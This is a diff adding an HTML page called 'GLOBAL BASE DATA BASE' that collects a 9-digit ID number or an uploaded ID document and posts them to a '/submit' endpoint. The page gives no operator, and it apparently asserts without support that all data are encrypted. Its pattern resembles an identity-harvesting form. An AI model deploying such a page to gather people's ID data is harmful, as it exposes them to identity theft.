@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>GLOBAL BASE DATA BASE</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: "Segoe UI", Arial, sans-serif;
+      background: url("background.png") no-repeat center center fixed;
+      background-size: cover;
+      margin: 0;
+      padding: 15px;
+      position: relative;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    /* Overlay for readability */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.65);
+      z-index: -1;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.25);
+      backdrop-filter: blur(10px);
+      padding: 35px 40px;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      animation: fadeIn 0.6s ease;
+    }
+    .title {
+      font-size: 22px;
+      color: #1a1a1a;
+      margin-bottom: 25px;
+      letter-spacing: 0.5px;
+      font-weight: bold;
+    }
+    @media (max-width: 480px) {
+      .title {
+        font-size: 18px;
+      }
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    label {
+      text-align: left;
+      font-weight: 600;
+      margin-bottom: 6px;
+      font-size: 0.95em;
+      color: #333;
+    }
+    input[type="text"], input[type="file"] {
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 1em;
+      width: 100%;
+      transition: all 0.25s ease;
+    }
+    input[type="text"]:focus, input[type="file"]:focus {
+      border-color: #0078d4;
+      box-shadow: 0 0 0 3px rgba(0,120,212,0.2);
+      outline: none;
+    }
+    button {
+      background: linear-gradient(135deg, #0078d4, #005a9e);
+      color: white;
+      padding: 14px;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: bold;
+      transition: background 0.3s ease, transform 0.1s ease;
+    }
+    button:hover {
+      background: linear-gradient(135deg, #005a9e, #004377);
+      transform: translateY(-2px);
+    }
+    .error {
+      color: #d32f2f;
+      font-weight: bold;
+      margin-top: 10px;
+      font-size: 0.9em;
+      text-align: center;
+    }
+    .success {
+      color: green;
+      font-weight: bold;
+      margin-top: 10px;
+      font-size: 0.95em;
+      text-align: center;
+    }
+    .optional {
+      font-size: 0.8em;
+      color: #666;
+      text-align: left;
+      margin-top: -8px;
+    }
+    p {
+      font-size: 0.85em;
+      color: #555;
+      margin-top: 20px;
+      line-height: 1.4;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1 class="title">
+      GLOBAL BASE DATA BASE
+    </h1>
+
+    <form id="idForm" enctype="multipart/form-data">
+      <div>
+        <label for="id">Enter ID here:</label>
+        <input 
+          type="text" 
+          id="id" 
+          name="id" 
+          maxlength="9" 
+          inputmode="numeric" 
+          pattern="\d*"
+        >
+      </div>
+
+      <div>
+        <label for="file">Upload ID:</label>
+        <input type="file" id="file" name="file" accept=".jpg,.jpeg,.png,.gif,.pdf">
+        <div class="optional">(optional — accepts image or PDF)</div>
+      </div>
+
+      <button type="submit">Submit</button>
+    </form>
+
+    <div id="errorBox" class="error" aria-live="polite"></div>
+    <div id="successBox" class="success" aria-live="polite"></div>
+
+    <p><strong>All data are encrypted and used for verification purposes alone.</strong></p>
+  </div>
+
+  <script>
+    const form = document.getElementById("idForm");
+    const errorBox = document.getElementById("errorBox");
+    const successBox = document.getElementById("successBox");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault(); // stop reload
+
+      errorBox.textContent = "";
+      successBox.textContent = "";
+
+      const idInput = document.getElementById("id").value.trim();
+      const fileInput = document.getElementById("file").files.length;
+
+      if (idInput !== "" && !/^\d{9}$/.test(idInput)) {
+        errorBox.textContent = "ID must be exactly 9 digits.";
+        return;
+      }
+
+      if (idInput === "" && fileInput === 0) {
+        errorBox.textContent = "Please provide a 9-digit ID or upload a file.";
+        return;
+      }
+
+      const formData = new FormData(form);
+
+      try {
+        const response = await fetch("/submit", {
+          method: "POST",
+          body: formData
+        });
+
+        const result = await response.text();
+        successBox.textContent = result; // show backend message
+      } catch (err) {
+        errorBox.textContent = "Something went wrong. Please try again.";
+      }
+    });
+  </script>
+</body>
+</html>
